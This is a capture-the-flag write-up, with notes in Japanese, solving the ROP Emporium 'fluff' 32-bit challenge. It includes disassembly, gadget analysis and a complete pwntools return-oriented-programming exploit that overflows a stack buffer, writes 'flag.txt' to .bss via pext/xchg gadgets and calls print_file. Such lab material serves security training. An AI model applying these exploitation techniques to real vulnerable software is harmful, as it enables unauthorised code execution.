# fluff-x86

## Description

The concept here is similar to the write4 challenge,
although we may struggle to find simple gadgets that will get the job done.

Click below to download the binary:

[x86_64](https://ropemporium.com/binary/fluff.zip)[x86](https://ropemporium.com/binary/fluff32.zip)[ARMv5](https://ropemporium.com/binary/fluff_armv5.zip)[MIPS](https://ropemporium.com/binary/fluff_mipsel.zip)

### Working backwards

Once we've employed our usual drills of checking protections and searching for interesting symbols & strings, we can think about what we're trying to acheive and plan our chain. A solid approach is to work backwards: we'll need a write gadget - for example `mov [reg], reg` or something equivalent - to make the actual write, so we can start there.

### Do it!

There's not much more to this challenge, we just have to think about ways to move data into the registers we want to control. Sometimes we'll need to take an indirect approach, especially in smaller binaries with fewer available gadgets like this one. If you're using a gadget finder like ropper, you may need to tell it to search for longer gadgets. **As usual, you'll need to call the `print_file()` function with a path to the flag as its only argument. Some useful(?) gadgets are available at the `questionableGadgets` symbol.**

## Solution

安定のnot canary foundなので一安心（クズ）

```
✦ ❯ checksec --file=fluff32
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   RW-RUNPATH   68) Symbols	  No	0		0	fluff32
```

write4と似たような感じって言っているのでとりあえず進めていくか。

```
0000069d <pwnme>:
 69d:	55                   	push   ebp
 69e:	89 e5                	mov    ebp,esp
 6a0:	53                   	push   ebx
 6a1:	83 ec 24             	sub    esp,0x24
 6a4:	e8 f7 fe ff ff       	call   5a0 <__x86.get_pc_thunk.bx>
 6a9:	81 c3 57 19 00 00    	add    ebx,0x1957
 6af:	8b 83 f8 ff ff ff    	mov    eax,DWORD PTR [ebx-0x8]
 6b5:	8b 00                	mov    eax,DWORD PTR [eax]
 6b7:	6a 00                	push   0x0
 6b9:	6a 02                	push   0x2
 6bb:	6a 00                	push   0x0
 6bd:	50                   	push   eax
 6be:	e8 9d fe ff ff       	call   560 <setvbuf@plt>
 6c3:	83 c4 10             	add    esp,0x10
 6c6:	83 ec 0c             	sub    esp,0xc
 6c9:	8d 83 f8 e7 ff ff    	lea    eax,[ebx-0x1808]
 6cf:	50                   	push   eax
 6d0:	e8 6b fe ff ff       	call   540 <puts@plt>
 6d5:	83 c4 10             	add    esp,0x10
 6d8:	83 ec 0c             	sub    esp,0xc
 6db:	8d 83 0e e8 ff ff    	lea    eax,[ebx-0x17f2]
 6e1:	50                   	push   eax
 6e2:	e8 59 fe ff ff       	call   540 <puts@plt>
 6e7:	83 c4 10             	add    esp,0x10
 6ea:	83 ec 04             	sub    esp,0x4
 6ed:	6a 20                	push   0x20
 6ef:	6a 00                	push   0x0
 6f1:	8d 45 d8             	lea    eax,[ebp-0x28]
 6f4:	50                   	push   eax
 6f5:	e8 86 fe ff ff       	call   580 <memset@plt>
 6fa:	83 c4 10             	add    esp,0x10
 6fd:	83 ec 0c             	sub    esp,0xc
 700:	8d 83 14 e8 ff ff    	lea    eax,[ebx-0x17ec]
 706:	50                   	push   eax
 707:	e8 34 fe ff ff       	call   540 <puts@plt>
 70c:	83 c4 10             	add    esp,0x10
 70f:	83 ec 0c             	sub    esp,0xc
 712:	8d 83 5c e8 ff ff    	lea    eax,[ebx-0x17a4]
 718:	50                   	push   eax
 719:	e8 f2 fd ff ff       	call   510 <printf@plt>
 71e:	83 c4 10             	add    esp,0x10
 721:	83 ec 04             	sub    esp,0x4
 724:	68 00 02 00 00       	push   0x200
 729:	8d 45 d8             	lea    eax,[ebp-0x28]
 72c:	50                   	push   eax
 72d:	6a 00                	push   0x0
 72f:	e8 cc fd ff ff       	call   500 <read@plt>
 734:	83 c4 10             	add    esp,0x10
 737:	83 ec 0c             	sub    esp,0xc
 73a:	8d 83 5f e8 ff ff    	lea    eax,[ebx-0x17a1]
 740:	50                   	push   eax
 741:	e8 fa fd ff ff       	call   540 <puts@plt>
 746:	83 c4 10             	add    esp,0x10
 749:	90                   	nop
 74a:	8b 5d fc             	mov    ebx,DWORD PTR [ebp-0x4]
 74d:	c9                   	leave  
 74e:	c3                   	ret  
```



```read(0,ebp-0x28,0x200)```なので44文字入力してからもう一回pwnmeの場所を呼び出して見る

```
080483b0 <pwnme@plt>:
 80483b0:	ff 25 0c a0 04 08    	jmp    DWORD PTR ds:0x804a00c
 80483b6:	68 00 00 00 00       	push   0x0
 80483bb:	e9 e0 ff ff ff       	jmp    80483a0 <.plt>
```

```
fluff by ROP Emporium
x86

You know changing these strings means I have to rewrite my solutions...
> Thank you!
fluff by ROP Emporium
x86

You know changing these strings means I have to rewrite my solutions...
> Thank you!
fish: Process 24269, './fluff32' from job 2, 'python2 -c "print 'A'*44 + '\xb…' terminated by signal SIGSEGV (Address boundary error)
```

```
0804a020 B __bss_start
0804a020 b completed.7283
0804a018 D __data_start
0804a018 W data_start
08048450 t deregister_tm_clones
08048430 T _dl_relocate_static_pie
080484d0 t __do_global_dtors_aux
08049f00 d __do_global_dtors_aux_fini_array_entry
0804a01c D __dso_handle
08049f04 d _DYNAMIC
0804a020 D _edata
0804a024 B _end
080485c4 T _fini
080485d8 R _fp_hw
08048500 t frame_dummy
08049efc d __frame_dummy_init_array_entry
08048740 r __FRAME_END__
0804a000 d _GLOBAL_OFFSET_TABLE_
         w __gmon_start__
080485ec r __GNU_EH_FRAME_HDR
08048378 T _init
08049f00 d __init_array_end
08049efc d __init_array_start
080485dc R _IO_stdin_used
080485c0 T __libc_csu_fini
08048560 T __libc_csu_init
         U __libc_start_main@@GLIBC_2.0
08048506 T main
         U print_file
         U pwnme
08048543 t questionableGadgets
08048490 t register_tm_clones
080483f0 T _start
0804a020 D __TMC_END__
0804852a t usefulFunction
08048440 T __x86.get_pc_thunk.bx
```

print_fileが何をしてるのか見てくる

write4と変わらんので見なくてヨシ(๑•̀ㅂ•́)و✧

メモリに書き込まなきゃいけないので、

書き込める場所を探す

```
Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1
  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4
  [ 3] .note.gnu.bu[...] NOTE            08048188 000188 000024 00   A  0   0  4
  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 00003c 04   A  5   0  4
  [ 5] .dynsym           DYNSYM          080481e8 0001e8 0000b0 10   A  6   1  4
  [ 6] .dynstr           STRTAB          08048298 000298 00008a 00   A  0   0  1
  [ 7] .gnu.version      VERSYM          08048322 000322 000016 02   A  5   0  2
  [ 8] .gnu.version_r    VERNEED         08048338 000338 000020 00   A  6   1  4
  [ 9] .rel.dyn          REL             08048358 000358 000008 08   A  5   0  4
  [10] .rel.plt          REL             08048360 000360 000018 08  AI  5  23  4
  [11] .init             PROGBITS        08048378 000378 000023 00  AX  0   0  4
  [12] .plt              PROGBITS        080483a0 0003a0 000040 04  AX  0   0 16
  [13] .plt.got          PROGBITS        080483e0 0003e0 000008 08  AX  0   0  8
  [14] .text             PROGBITS        080483f0 0003f0 0001d2 00  AX  0   0 16
  [15] .fini             PROGBITS        080485c4 0005c4 000014 00  AX  0   0  4
  [16] .rodata           PROGBITS        080485d8 0005d8 000014 00   A  0   0  4
  [17] .eh_frame_hdr     PROGBITS        080485ec 0005ec 000044 00   A  0   0  4
  [18] .eh_frame         PROGBITS        08048630 000630 000114 00   A  0   0  4
  [19] .init_array       INIT_ARRAY      08049efc 000efc 000004 04  WA  0   0  4
  [20] .fini_array       FINI_ARRAY      08049f00 000f00 000004 04  WA  0   0  4
  [21] .dynamic          DYNAMIC         08049f04 000f04 0000f8 08  WA  6   0  4
  [22] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4
  [23] .got.plt          PROGBITS        0804a000 001000 000018 04  WA  0   0  4
  [24] .data             PROGBITS        0804a018 001018 000008 00  WA  0   0  4
  [25] .bss              NOBITS          0804a020 001020 000004 00  WA  0   0  1
  [26] .comment          PROGBITS        00000000 001020 000029 01  MS  0   0  1
  [27] .symtab           SYMTAB          00000000 00104c 000440 10     28  47  4
  [28] .strtab           STRTAB          00000000 00148c 000216 00      0   0  1
  [29] .shstrtab         STRTAB          00000000 0016a2 000105 00      0   0  1

```

```
[25] .bss              NOBITS          0804a020 001020 000004 00  WA  0   0  1
```

をつかうかぁ。

良さげなROP Gadgetを探してくる...

なんか簡単には見つけられそうになかったので、いろんな物を組み合わせる必要がありそう.

```
08048543 <questionableGadgets>:
 8048543:       89 e8                   mov    eax,ebp
 8048545:       bb ba ba ba b0          mov    ebx,0xb0bababa
 804854a:       c4 e2 62 f5 d0          pext   edx,ebx,eax
 804854f:       b8 ef be ad de          mov    eax,0xdeadbeef
 8048554:       c3                      ret    
 8048555:       86 11                   xchg   BYTE PTR [ecx],dl
 8048557:       c3                      ret    
 8048558:       59                      pop    ecx
 8048559:       0f c9                   bswap  ecx
 804855b:       c3                      ret    
 804855c:       66 90                   xchg   ax,ax
 804855e:       66 90                   xchg   ax,ax

```

疑わしいガジェットってのがあったので、

そこの命令を見てみる。

![image-20211228105820775](/home/mizuiro/.config/Typora/typora-user-images/image-20211228105820775.png)

![image-20211228105800151](/home/mizuiro/.config/Typora/typora-user-images/image-20211228105800151.png)

完全にpextの説明を読み間違えていて、すんごい時間かかっていた。

俺ってすっごいバカ

二番目のregはデータで

三番目のregはmaskとなる。

あとはよしなにやってあげるとこんな感じのソルバが出来た

```
import textwrap
from pwn import *
from pwnlib.gdb import binary
from bitarray import bitarray


BINARY = './fluff32'
context.os = 'linux'
context.arch = 'i386'
context.binary = BINARY

#address
bss_address = 0x0804a020 #bss_address = 0x0804a020
print_file = 0x080483d0

#gadget
'''
 8048543:       89 e8                   mov    eax,ebp
 8048545:       bb ba ba ba b0          mov    ebx,0xb0bababa
 804854a:       c4 e2 62 f5 d0          pext   edx,ebx,eax
 804854f:       b8 ef be ad de          mov    eax,0xdeadbeef
 8048554:       c3                      ret
'''
pext = 0x08048543 # pext
pop_ebp = 0x080485bb #: pop ebp ; ret
pop_ecx_bswap_ecx = 0x08048558 # pop ecx ; bswap ecx ; ret
xchg_ecx_dl = 0x08048555 #: xchg byte ptr [ecx], dl ; ret         
pop_ecx_ebp = 0x08048524 #: pop ecx ; pop ebp ; lea esp, [ecx - 4] ; ret

# dl - 8bit

def bytes2bin(data,offset=32):
    return bin(unpack(data,offset,endian='little'))[2:]
def for_p32(data,offset=8):
    return hex(int(data,2))
def output_data(data):
    open('input', 'wb').write(data)

def create_mask(desired_value,src,desired_offset=8):
    r""" 
    Create a mask for pext instruction.
    :param desired_value: The desired value of the mask.
    :param src: The source value of the mask.
    :return: The mask.  
    
    Reffrence:https://www.felixcloutier.com/x86/pext
    """
    desired_value.zfill(desired_offset)


    src = src[::-1]
    desired_value = desired_value[::-1]
    ret = ''
    desired_value_index = 0
    for i in range(len(src)):
        if desired_value[desired_value_index] == src[i]:
            ret = '1' + ret
            desired_value_index+=1
        else:
            ret = '0' + ret
        
        if(desired_value_index == len(desired_value)):
                return ret
    return ret

def fill_ecx(val):
    r"""
    Fill ecx with desired value.
    :param val: The desired value.
    :return: The payload.
    """
    chain = b""
    chain += p32(pop_ecx_bswap_ecx)
    chain += pack(val, 32, endianness="big")
    return chain
def write_to_adr(val,adr,offset=32):
    r"""
    Write to address.
    :param val: The value to write.
    :param adr: The address to write.
    :param offset: The offset of the address.
    :return: The value written rop.
    """
    val_bin = bytes2bin(val,offset).zfill(offset)
    src = bin(0xb0bababa)[2:]
    val_bytes = textwrap.wrap(val_bin,8)
    masks = []
    for val_byte in val_bytes:
        log.info(f"val_byte:{val_byte} -> {pack(int('0b'+val_byte,2),8)}")
        created_mask = create_mask(val_byte,src)
        padded_mask = created_mask.zfill(32)
        log.info(f'padded_mask:{padded_mask}')
        masks.append(padded_mask)
    
    log.info(f"masks:{masks}")
    log.info("###############################################")
    log.info("# WRITE TO ADDRESS #")
    log.info("###############################################")

    chain = b""
    index = 0
    for mask in masks[::-1]:
        chain += p32(pop_ebp)
        mask_int_val = int(mask,2)
        mask_byte_str = pack(mask_int_val,32)
        log.info(f"mask_int_val:{mask_int_val}")
        print(f"mask_byte_str:{mask_byte_str}")
        chain += mask_byte_str
        chain += p32(pext)
        chain += fill_ecx(adr+index)
        chain += p32(xchg_ecx_dl)
        index += 1
    return chain
def exploit():
    rop = b'A'*44
    rop+=write_to_adr(b'flag.txt',bss_address,64)
    rop+=p32(print_file)
    rop+=b'BBBB'
    rop+=p32(bss_address)
    return rop



# print(bin(0xb0bababa)[2:])
log.info(f'src: {bin(0xb0bababa)[2:]}')
log.info(f"created_mask:{create_mask(bytes2bin(b'l',8),bin(0xb0bababa)[2:],8)}")
log.info(f'b"l":{bytes2bin(b"l",8)}')
write_to_adr(b'flag.txt',bss_address,64)
# print(bytes2bin(b'flag.txt',64))
# example b'l'
#10110000101110101011101010111010  bin(0xb0bababa)[2:]
#00000000000000000000001011011101  created_mask
#00000000000000000000000001101100  望むやつ
# write_to_adr(b'flag.txt',bss_address)
rop = exploit()
p = process(BINARY)
p.sendline(rop)
flag = p.recvall()
print(flag)
output_data(rop)
```

今回pextのために作った関数はこの先も使うだろうからライブラリ化しておかなきゃなー

```
✦ ❯ python3 solve.py 
[*] '/mnt/nvme0n1p7/security/rop-emporium/fluff32/fluff32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
    RUNPATH:  b'.'
[*] src: 10110000101110101011101010111010
[*] created_mask:1011011101
[*] b"l":1101100
[*] val_byte:01110100 -> b't'
[*] padded_mask:00000000000000000100101011001101
[*] val_byte:01111000 -> b'x'
[*] padded_mask:00000000000000000101101011000101
[*] val_byte:01110100 -> b't'
[*] padded_mask:00000000000000000100101011001101
[*] val_byte:00101110 -> b'.'
[*] padded_mask:00000000000000000000010111011011
[*] val_byte:01100111 -> b'g'
[*] padded_mask:00000000000000000100101101011010
[*] val_byte:01100001 -> b'a'
[*] padded_mask:00000000000000000101110101000110
[*] val_byte:01101100 -> b'l'
[*] padded_mask:00000000000000000000011011011101
[*] val_byte:01100110 -> b'f'
[*] padded_mask:00000000000000000100101101001011
[*] masks:['00000000000000000100101011001101', '00000000000000000101101011000101', '00000000000000000100101011001101', '00000000000000000000010111011011', '00000000000000000100101101011010', '00000000000000000101110101000110', '00000000000000000000011011011101', '00000000000000000100101101001011']
[*] ###############################################
[*] # WRITE TO ADDRESS #
[*] ###############################################
[*] mask_int_val:19275
mask_byte_str:b'KK\x00\x00'
[*] mask_int_val:1757
mask_byte_str:b'\xdd\x06\x00\x00'
[*] mask_int_val:23878
mask_byte_str:b'F]\x00\x00'
[*] mask_int_val:19290
mask_byte_str:b'ZK\x00\x00'
[*] mask_int_val:1499
mask_byte_str:b'\xdb\x05\x00\x00'
[*] mask_int_val:19149
mask_byte_str:b'\xcdJ\x00\x00'
[*] mask_int_val:23237
mask_byte_str:b'\xc5Z\x00\x00'
[*] mask_int_val:19149
mask_byte_str:b'\xcdJ\x00\x00'
[*] val_byte:01110100 -> b't'
[*] padded_mask:00000000000000000100101011001101
[*] val_byte:01111000 -> b'x'
[*] padded_mask:00000000000000000101101011000101
[*] val_byte:01110100 -> b't'
[*] padded_mask:00000000000000000100101011001101
[*] val_byte:00101110 -> b'.'
[*] padded_mask:00000000000000000000010111011011
[*] val_byte:01100111 -> b'g'
[*] padded_mask:00000000000000000100101101011010
[*] val_byte:01100001 -> b'a'
[*] padded_mask:00000000000000000101110101000110
[*] val_byte:01101100 -> b'l'
[*] padded_mask:00000000000000000000011011011101
[*] val_byte:01100110 -> b'f'
[*] padded_mask:00000000000000000100101101001011
[*] masks:['00000000000000000100101011001101', '00000000000000000101101011000101', '00000000000000000100101011001101', '00000000000000000000010111011011', '00000000000000000100101101011010', '00000000000000000101110101000110', '00000000000000000000011011011101', '00000000000000000100101101001011']
[*] ###############################################
[*] # WRITE TO ADDRESS #
[*] ###############################################
[*] mask_int_val:19275
mask_byte_str:b'KK\x00\x00'
[*] mask_int_val:1757
mask_byte_str:b'\xdd\x06\x00\x00'
[*] mask_int_val:23878
mask_byte_str:b'F]\x00\x00'
[*] mask_int_val:19290
mask_byte_str:b'ZK\x00\x00'
[*] mask_int_val:1499
mask_byte_str:b'\xdb\x05\x00\x00'
[*] mask_int_val:19149
mask_byte_str:b'\xcdJ\x00\x00'
[*] mask_int_val:23237
mask_byte_str:b'\xc5Z\x00\x00'
[*] mask_int_val:19149
mask_byte_str:b'\xcdJ\x00\x00'
[+] Starting local process './fluff32': pid 291185
[+] Receiving all data: Done (145B)
[*] Process './fluff32' stopped with exit code -11 (SIGSEGV) (pid 291185)
b'fluff by ROP Emporium\nx86\n\nYou know changing these strings means I have to rewrite my solutions...\n> Thank you!\nROPE{a_placeholder_32byte_flag!}\n'

```

